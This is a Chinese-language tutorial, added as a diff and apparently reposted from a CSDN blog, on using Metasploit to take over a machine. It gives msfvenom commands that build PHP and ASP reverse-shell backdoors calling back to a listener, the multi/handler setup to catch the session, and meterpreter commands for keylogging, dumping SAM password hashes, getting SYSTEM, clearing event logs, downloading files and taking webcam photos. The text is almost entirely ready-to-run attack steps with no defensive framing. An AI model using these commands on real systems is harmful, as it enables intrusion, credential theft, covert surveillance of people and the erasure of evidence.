@@ -1,0 +1,132 @@
+一   建立反弹后门
+msfvenom -p php/meterpreter/reverse_tcpLHOST=192.168.2.146 LPORT=5555 R > test3.php
+
+ 
+注：生成的反弹木马存放在当前用户home目录下；
+将生成的木马上传到目标机中，可以远程访问；
+windows下asp反弹木马：
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.131 -f asp > shell.asp
+ 
+ 
+ 
+ 
+ 
+ 
+二 监听端口建立会话
+1 使用handler模块
+msf > use exploit/multi/handler
+2 设置payload
+msf exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp（当时windows时php换成windows）
+PAYLOAD =>php/meterpreter/reverse_tcp
+3 设置监听主机
+msfexploit(multi/handler) > set LHOST 192.168.88.155
+LHOST =>192.168.88.155
+4 设置监听端口（默认4444）
+msfexploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+5 发动攻击
+msfexploit(multi/handler) > exploit
+
+注:要远程访问你上传的后门文件
+ 
+meterpreter > keyscan_start
+
+keyscan_dump // 查看键盘记录
+
+监控目标系统键盘输入，停止监控为keyscan_stop
+
+ 
+meterpreter > migrate
+
+将你的Meterpreter移到另一个进程
+
+先用PS命令查看进程后，得到进程ID，然后在执行Migrate （进程ID）
+
+ 
+meterpreter > getuid
+
+获取用户的服务器运行
+
+meterpreter > shell
+
+进入目标电脑，命令提示符
+
+meterpreter > Idletime
+
+目标电脑闲置了多长时间
+
+meterpreter > Hashdump
+
+导出对方SAM数据库里的内容,推荐一个hash破解网站：
+
+http://www.objectif-securite.ch/products.php
+
+meterpreter > getsystem
+
+利用已自漏洞，自动提权为SYSTEM
+
+ 
+meterpreter > clearev
+
+清除事件日志
+
+ 
+ meterpreter > execute（某Windows指令）
+
+在对方电脑上运行该指令
+
+meterpreter > execute 
+Usage: execute -f file [options]
+ 
+meterpreter > download（文件路径）
+
+下载文件命令
+
+例如下载C盘下面的jzking121.txt文件
+
+meterpreter > download c:\\jzking121.txt
+
+[*] downloading: c:\jzking121.txt -> jzking121.txt
+
+[*] downloaded : c:\jzking121.txt -> jzking121.txt
+
+注意，文件路径中要有两个\\
+Upload指令跟Download指令类似！
+ 
+ meterpreter > shutdown 
+
+关闭目标计算机，reboot为重启计算机
+
+ 
+meterpreter >screenshot
+
+获取目标电脑，屏幕截图
+
+ 
+ meterpreter > uictl enable keyboard 启用目标使用键盘
+
+meterpreter > uictl disable mouse   禁止目标使用鼠标
+
+enable 为启用
+
+disable 禁用
+
+ 
+ meterpreter > webcam_list
+
+目标系统的摄像头列表
+
+ 
+ meterpreter > webcam_snap
+
+从指定的摄像头，拍摄照片
+
+ 
+ meterpreter > search -d c:\\ -f 1.jpg
+
+搜索目标电脑，C盘1.jpg文件
+--------------------- 
+作者：于尘世中迷途小书童 
+来源：CSDN 
+原文：https://blog.csdn.net/u012991692/article/details/80784258 
+版权声明：本文为博主原创文章，转载请附上博文链接！
